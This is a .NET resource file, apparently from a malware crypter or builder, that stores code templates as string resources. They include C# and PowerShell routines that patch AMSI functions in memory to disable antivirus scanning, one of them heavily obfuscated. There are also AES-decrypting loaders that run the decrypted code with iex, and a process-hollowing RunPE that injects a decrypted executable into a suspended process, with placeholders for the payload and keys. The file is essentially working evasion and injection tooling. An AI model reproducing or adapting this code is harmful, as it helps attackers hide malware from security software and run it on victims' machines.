<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="Patch" xml:space="preserve">
    <value>using System.Runtime.InteropServices;
using System;
using System.Text;
namespace __Patch
{
public class __Patcher
{
         [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            public void PatchAMSI()
            {
                var library = LoadLibrary(Base64Decode("YW1zaS5kbGw="));

            // Get the AmsiScanBuffer process
            var scanBuff = GetProcAddress(library, Base64Decode("QW1zaVNjYW5CdWZmZXI="));

            var patch = AMSIPatch;

                VirtualProtect(scanBuff, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                Marshal.Copy(patch, 0, scanBuff, patch.Length);
                VirtualProtect(scanBuff, (UIntPtr)patch.Length, oldProtect, out uint _);

                return;
            }

             public static string Base64Decode(string base64EncodeData)
             {
                var base64bytes = Convert.FromBase64String(base64EncodeData);
                return Encoding.UTF8.GetString(base64bytes);
             }

        static byte[] AMSIPatch
            {
                get
                {
                    // 64 bit
                    if (IntPtr.Size == 8)
                    {
                    return Convert.FromBase64String("uFcAB4DD");
                    }

                   return Convert.FromBase64String("uFcAB4DCGAA=");
            }
            }
        }
}</value>
  </data>
  <data name="PowershellPatch" xml:space="preserve">
    <value>$roflr = @"
using System;
using System.Runtime.InteropServices;
public class roflr {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ccrvcj, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $roflr

$smoibhc = [roflr]::LoadLibrary("$(('ämsì.d'+'ll').normALIZe([char]([BytE]0x46)+[ChAr]([byTe]0x6f)+[cHAR]([Byte]0x72)+[cHAr]([Byte]0x6d)+[ChAR](27+41)) -replace [chaR](92+8-8)+[cHaR](108+4)+[ChaR]([Byte]0x7b)+[CHar](77+10-10)+[cHar]([bYtE]0x6e)+[cHar]([bytE]0x7d))")
$mqacvr = [roflr]::GetProcAddress($smoibhc, "$([cHaR]([BYtE]0x41)+[cHar](109)+[ChAr]([bYte]0x73)+[ChAR]([BYTE]0x69)+[char](83+56-56)+[ChAr](99+8-8)+[cHAR](97)+[CHAR]([bYte]0x6e)+[CHAr](23+43)+[cHAR]([BYtE]0x75)+[cHAR]([byTe]0x66)+[cHAr]([BYTe]0x66)+[cHar]([ByTe]0x65)+[cHAR]([ByTE]0x72))")
$p = 0
[roflr]::VirtualProtect($mqacvr, [uint32]5, 0x40, [ref]$p)
$dsag = "0xB8"
$viam = "0x57"
$nonk = "0x00"
$pewf = "0x07"
$yuhz = "0x80"
$qtod = "0xC3"
$oclox = [Byte[]] ($dsag,$viam,$nonk,$pewf,+$yuhz,+$qtod)
[System.Runtime.InteropServices.Marshal]::Copy($oclox, 0, $mqacvr, 6)</value>
  </data>
  <data name="PowershellPatchLoader" xml:space="preserve">
    <value>$encryptedBytes = [System.Convert]::FromBase64String("%CIPHER%")
$keyBase64 = "%THEKEY%"
$ivBase64 = "%THEIV%"
function DecryptAndRunPowerShellCode {
    param (
        [byte[]]$encryptedBytes,
        [byte[]]$key,
        [byte[]]$iv
    )

    try {
        $plainText = DecryptBytesToString $encryptedBytes $key $iv

        # Execute the decrypted PowerShell code
        Invoke-Expression $plainText
    } catch {
        Write-Error "Failed to decrypt and run PowerShell code: $($_.Exception.Message)"
    }
}

function DecryptBytesToString {
    param (
        [byte[]]$encryptedBytes,
        [byte[]]$key,
        [byte[]]$iv
    )

    try {
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = $key
        $aes.IV = $iv

        $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

        $memoryStream = New-Object System.IO.MemoryStream($encryptedBytes, 0, $encryptedBytes.Length)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $streamReader = New-Object System.IO.StreamReader($cryptoStream)
        $plainText = $streamReader.ReadToEnd()

        $streamReader.Dispose()
        $cryptoStream.Dispose()
        $memoryStream.Dispose()

        return $plainText
    } catch {
        Write-Error "Failed to decrypt bytes to string: $($_.Exception.Message)"
    }
}

# Base64-encoded key and IV obtained from the C# code
# Convert Base64-encoded key and IV to byte arrays
$key = [System.Convert]::FromBase64String($keyBase64)
$iv = [System.Convert]::FromBase64String($ivBase64)

# Call the decryption function to decrypt and run the PowerShell code
DecryptAndRunPowerShellCode $encryptedBytes $key $iv</value>
  </data>
  <data name="PowershellRunPe" xml:space="preserve">
    <value>$id = get-random
$code = @"
using System.Reflection;
using System.Threading;
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
namespace HelloWorld
{
    public class Program$id
    {
        // Implement required kernel32.dll functions 
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);


        public static void Main()
        {
            Patch.Patcher();
            byte[] data = DecryptAES(Convert.FromBase64String("%PAYLOADHERE%"),Convert.FromBase64String("%KEYHERE%"),Convert.FromBase64String("%IVHERE%"));
            Console.WriteLine("Loading From Memory...");
             var assembly = Assembly.Load(data);
MethodInfo method = assembly.EntryPoint;
if (method != null)
{
    // Get the parameters of the main method
    ParameterInfo[] parameters = method.GetParameters();

    // Check if the main method has parameters
    if (parameters.Length &gt; 0)
    {
        // Create an array to hold the arguments
        object[] args = new object[parameters.Length];

        // Set the values for the arguments based on their types
        for (int i = 0; i &lt; parameters.Length; i++)
        {
            if (parameters[i].ParameterType == typeof(string[]))
            {
                // If the parameter type is string[], pass an empty array
                args[i] = new string[] { };
            }
            else
            {
                // For other parameter types, pass null
                args[i] = null;
            }
        }

        // Invoke the main method with the arguments
        method.Invoke(null, args);
    }
    else
    {
        // If the main method has no parameters, invoke it with null arguments
        method.Invoke(null, null);
    }
}
        }
     
        public static byte[] DecryptAES(byte[] cipherText, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                 aes.KeySize = 128;
                 aes.BlockSize = 128;
                 aes.Padding = PaddingMode.Zeros;
                 aes.Key = key;
                 aes.IV = iv;

                 using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(cipherText, decryptor);
                }
            }
        }

        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
          public static Thread RunFromMemory(byte[] bytes)
        {
            var thread = new Thread(new ThreadStart(() =&gt;
            {
                var assembly = Assembly.Load(bytes);
                MethodInfo method = assembly.EntryPoint;
                if (method != null)
                {
                    string[] args = {};
                    method.Invoke(null, new object[] {args});
                }
            }));

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            return thread;
        }
    }


    class Patch 
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint LdrLoadDll(IntPtr PathToFile, uint Flags, ref UNICODE_STRING ModuleFileName, out IntPtr ModuleHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint LdrUnloadDll(IntPtr ModuleHandle);
    
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferSize, out uint BytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint LdrGetProcedureAddress(IntPtr hModule, IntPtr ProcedureName, int ProcedureNumber, out IntPtr pFunction);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public uint Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        public static void Patcher() 
        {
            int procId = Process.GetProcessesByName("Powershell")[0].Id;

            // Open the target process and get a handle to its memory
            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID cid = new CLIENT_ID();
            cid.UniqueProcess = new IntPtr(procId);

            uint ntStatus = NtOpenProcess(out hProcess, 0x1F0FFF, ref oa, ref cid);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to open process: {0}", ntStatus);
                return;
            }

            // Load the amsi.dll library and obtain the address of the AmsiOpenSession function
            UNICODE_STRING ModuleFileName = new UNICODE_STRING();
            RtlInitUnicodeString(ref ModuleFileName, "amsi.dll");
            IntPtr hModule = IntPtr.Zero;

            ntStatus = LdrLoadDll(IntPtr.Zero, 0, ref ModuleFileName, out hModule);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to load amsi.dll: {0}", ntStatus);
                NtClose(hProcess);
                return;
            }

            IntPtr pAmsiOpenSession = IntPtr.Zero;

            // Using an Ordinal 3 here as string was having an issue finding AmsiOpenSession
            ntStatus = LdrGetProcedureAddress(hModule, IntPtr.Zero, 3, out pAmsiOpenSession);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to find AmsiOpenSession function: {0}", ntStatus);
                LdrUnloadDll(hModule);
                NtClose(hProcess);
                return;
            }
           
            // Modify the memory protection of the AmsiOpenSession function
            IntPtr protectionBase = pAmsiOpenSession;
            IntPtr regionSize = new IntPtr(1);
            uint oldProtect = 0;
            uint newProtect = 0x40;

            ntStatus = NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, newProtect, out oldProtect);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to modify memory protection: {0}", ntStatus);
                LdrUnloadDll(hModule);
                NtClose(hProcess);
                return;
            }

            // Write the patch to the AmsiOpenSession function
            byte[] patch = { 0x75 };
            uint bytesWritten = 0;

            ntStatus = NtWriteVirtualMemory(hProcess, pAmsiOpenSession + 0x03, patch, 1, out bytesWritten);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to write to process memory: {0}", ntStatus);
            }

            // Restore the original memory protection of the AmsiOpenSession function
            ntStatus = NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, oldProtect, out oldProtect);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to restore memory protection: {0}", ntStatus);
            }

            Console.WriteLine("Amazing is Patched Have Fun!");

            // Unload the amsi.dll library
            ntStatus = LdrUnloadDll(hModule);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to unload amsi.dll: {0}", ntStatus);
            }

            // Close the process handle
            ntStatus = NtClose(hProcess);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to close process handle: {0}", ntStatus);
            }

        }

    }
}
"@
$assemblies = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp")
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp	
iex "[HelloWorld.Program$id]::Main()"</value>
  </data>
  <data name="PowershellRunPeLoader" xml:space="preserve">
    <value>$kmSoe=[System.Convert]::FromBase64String("%CIPHER%")
$bAseK64="%THEKEY%"
$jBZe64="%THEIV%"
function XpbygNPqLrDzG {
    param([byte[]]$kmSoe,[byte[]]$bAseK,[byte[]]$jBZe)
    try {
        $JmRTUe = DecryptBytesToString $kmSoe $bAseK $jBZe
        if (validateAndSanitizePowerShellCode $JmRTUe) {
            iex $JmRTUe
        } else {
            Write-Error "Failed to validate and sanitize PowerShell code"
        }
    } catch {
        Write-Error "Failed to decrypt and run PowerShell code: $($_.Exception.Message)"
    }
}

function validateAndSanitizePowerShellCode {
    param([string]$JmRTUe)
    try {
        [System.Management.Automation.Language.Parser]::ParseInput($JmRTUe, [ref]$null, [ref]$null)
        $sPGP = $JmRTUe -replace "Invoke-Expression", "" -replace "rm", ""
        return $sPGP
    } catch {
        Write-Error "Failed to validate and sanitize PowerShell code: $($_.Exception.Message)"
        return $null
    }
}

function DecryptBytesToString {
    param([byte[]]$kmSoe,[byte[]]$bAseK,[byte[]]$jBZe)
    try {
        $dbAes = New-Object System.Security.Cryptography.AesManaged
        $dbAes.Key = $bAseK
        $dbAes.IV = $jBZe
        $ycXgy = $dbAes.CreateDecryptor($dbAes.Key, $dbAes.IV)
        $emXjU = New-Object System.IO.MemoryStream($kmSoe, 0, $kmSoe.Length)
        $odWli = New-Object System.Security.Cryptography.CryptoStream($emXjU, $ycXgy, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $qxdmLRhJ = New-Object System.IO.StreamReader($odWli)
        $JmRTUe = $qxdmLRhJ.ReadToEnd()
        $qxdmLRhJ.Dispose()
        $odWli.Dispose()
        $emXjU.Dispose()
        return $JmRTUe
    } catch {
        Write-Error "Failed to decrypt bytes to string: $($_.Exception.Message)"
    }
}

$key = [System.Convert]::FromBase64String($bAseK64)
$iv = [System.Convert]::FromBase64String($jBZe64)
XpbygNPqLrDzG $kmSoe $key $iv</value>
  </data>
  <data name="RunPe" xml:space="preserve">
    <value>$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,out uint lpflOldProtect);
}
"@

Add-Type $Win32

foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)

    $registry = 'HKLM:\Software\Classes\CLSID\' + $provider + '\InprocServer32'
    $dllPath = Get-ItemPropertyValue -Name '(default)' $registry
    $providerDLL = Split-Path $dllPath -leaf
    $dll = $providerDLL -replace '"', ""
  
    $LoadLibrary = [Win32]::LoadLibrary($dll )
    $Address = [Win32]::GetProcAddress($LoadLibrary, "DllGetClassObject")
    $p = 0
    [Win32]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)
$id = get-random
$code = @"
using System;
using System.IO;
using System.Security.Cryptography;
namespace HelloWorld
{
	public class Program$id
	{
          [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool CreateProcess_API(string applicationName, string commandLine, System.IntPtr processAttributes, System.IntPtr threadAttributes, bool inheritHandles, uint creationFlags, System.IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool GetThreadContext_API(System.IntPtr thread, int[] context);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool Wow64GetThreadContext_API(System.IntPtr thread, int[] context);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "SetThreadContext")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool SetThreadContext_API(System.IntPtr thread, int[] context);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool Wow64SetThreadContext_API(System.IntPtr thread, int[] context);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool ReadProcessMemory_API(System.IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool WriteProcessMemory_API(System.IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [System.Runtime.InteropServices.DllImport("ntdll.dll", EntryPoint = "UnmapViewOfSection")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern int NtUnmapViewOfSection_API(System.IntPtr process, int baseAddress);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern int VirtualAllocEx_API(System.IntPtr handle, int address, int length, int type, int protect);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern int ResumeThread_API(System.IntPtr handle);
        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public System.IntPtr HasanHandle;
            public System.IntPtr TihradHandle;
            public uint _processıd;
            public uint _threadıd;
        } // PROCESS_INFORMATION

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size_;
            public string _reversed1s_;
            public string _desktop_;
            public string _title_;

            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int FLAGSS;
            public short wShowWindow;
            public short cbReserved2;
            public System.IntPtr Reserved2;
            public System.IntPtr StdInput;
            public System.IntPtr StdOutput;
            public System.IntPtr StdError;
        } 

        public static void Main()
        {
            Console.WriteLine("Reached");
            string path = "%PATH%";
            string cmd = "";
            byte[] data = DecryptAES(Convert.FromBase64String("%PAYLOADHERE%"),Convert.FromBase64String("%KEYHERE%"),Convert.FromBase64String("%IVHERE%"));
            bool compatible = false;
            for (int fri = 1; fri &lt;= 5; fri++)
            {
                if (HandleRun(path, cmd, data, compatible))
                    return;
            }

        } // Run

        public static byte[] DecryptAES(byte[] cipherText, byte[] key, byte[] iv)
{
    using (var aes = Aes.Create())
    {
        aes.KeySize = 128;
        aes.BlockSize = 128;
        aes.Padding = PaddingMode.Zeros;

        aes.Key = key;
        aes.IV = iv;

        using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
        {
            return PerformCryptography(cipherText, decryptor);
        }
    }
}

private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
{
    using (var ms = new MemoryStream())
    using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
    {
        cryptoStream.Write(data, 0, data.Length);
        cryptoStream.FlushFinalBlock();

        return ms.ToArray();
    }
}

        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            int ReadWrite = 0;
            string QuotedPath = string.Format("\"{0}\"", path);

            STARTUP_INFORMATION SI = new STARTUP_INFORMATION();
            PROCESS_INFORMATION PI = new PROCESS_INFORMATION();

            SI.FLAGSS = 0;
            SI.Size_ = System.Convert.ToUInt32(System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUP_INFORMATION)));

            try
            {
                if (!string.IsNullOrEmpty(cmd))
                    QuotedPath = QuotedPath + " " + cmd;

                if (!CreateProcess_API(path, QuotedPath, System.IntPtr.Zero, System.IntPtr.Zero, false, 4, System.IntPtr.Zero, null, ref SI, ref PI))
                    throw new System.Exception();

                int FileAddress = System.BitConverter.ToInt32(data, 60);
                int ImageBase = System.BitConverter.ToInt32(data, FileAddress + 52);

                int[] Context_ = new int[179];
                Context_[0] = 65538;

                if (System.IntPtr.Size == 4)
                {
                    if (!GetThreadContext_API(PI.TihradHandle, Context_))
                        throw new System.Exception();
                }
                else if (!Wow64GetThreadContext_API(PI.TihradHandle, Context_))
                    throw new System.Exception();

                int Ebx = Context_[41];
                int BaseAddress = 0;

                if (!ReadProcessMemory_API(PI.HasanHandle, Ebx + 8, ref BaseAddress, 4, ref ReadWrite))
                    throw new System.Exception();

                if (ImageBase == BaseAddress)  //Developer İntrusive
                {
                    if (!(NtUnmapViewOfSection_API(PI.HasanHandle, BaseAddress) == 0))
                        throw new System.Exception();
                }

                int SizeOfImage = System.BitConverter.ToInt32(data, FileAddress + 80);
                int SizeOfHeaders = System.BitConverter.ToInt32(data, FileAddress + 84);

                bool AllowOverride = false;
                int NewImageBase = VirtualAllocEx_API(PI.HasanHandle, ImageBase, SizeOfImage, 12288, 64); // R1  //Developer İntrusive

		//Developer İntrusive   //Developer İntrusive

                if (!compatible &amp;&amp; NewImageBase == 0)
                {
                    AllowOverride = true;
                    NewImageBase = VirtualAllocEx_API(PI.HasanHandle, 0, SizeOfImage, 12288, 64);
                }

                if (NewImageBase == 0)
                    throw new System.Exception();


                if (!WriteProcessMemory_API(PI.HasanHandle, NewImageBase, data, SizeOfHeaders, ref ReadWrite))
                    throw new System.Exception();

                int SectionOffset = FileAddress + 248;
                short NumberOfSections = System.BitConverter.ToInt16(data, FileAddress + 6);

                for (int fri = 0; fri &lt;= NumberOfSections - 1; fri++)
                {
                    int VirtualAddress = System.BitConverter.ToInt32(data, SectionOffset + 12);
                    int SizeOfRawData = System.BitConverter.ToInt32(data, SectionOffset + 16);
                    int PointerToRawData = System.BitConverter.ToInt32(data, SectionOffset + 20);

                    if (!(SizeOfRawData == 0))
                    {
                        byte[] SectionData = new byte[SizeOfRawData - 1 + 1];
                        System.Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length);

                        if (!WriteProcessMemory_API(PI.HasanHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ref ReadWrite))
                            throw new System.Exception();
                    }

                    SectionOffset += 40;
                }

                byte[] PointerData = System.BitConverter.GetBytes(NewImageBase);
                if (!WriteProcessMemory_API(PI.HasanHandle, Ebx + 8, PointerData, 4, ref ReadWrite))
                    throw new System.Exception();

                int AddressOfEntryPoint = System.BitConverter.ToInt32(data, FileAddress + 40);

                if (AllowOverride)
                    NewImageBase = ImageBase;
                Context_[44] = NewImageBase + AddressOfEntryPoint;

                if (System.IntPtr.Size == 4)
                {
                    if (!SetThreadContext_API(PI.TihradHandle, Context_))
                        throw new System.Exception();
                }
                else if (!Wow64SetThreadContext_API(PI.TihradHandle, Context_))
                    throw new System.Exception();

                if (ResumeThread_API(PI.TihradHandle) == -1)
                    throw new System.Exception();
            }
            catch
            {
                System.Diagnostics.Process Pros = System.Diagnostics.Process.GetProcessById(System.Convert.ToInt32(PI._processıd));
                if (Pros != null)
                    Pros.Kill();

                return false;
            }

            return true;
        }
	}
}
"@
$assemblies = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp")
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp	
iex "[HelloWorld.Program$id]::Main()"</value>
  </data>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="stub" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>Resources\stub.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </data>
</root>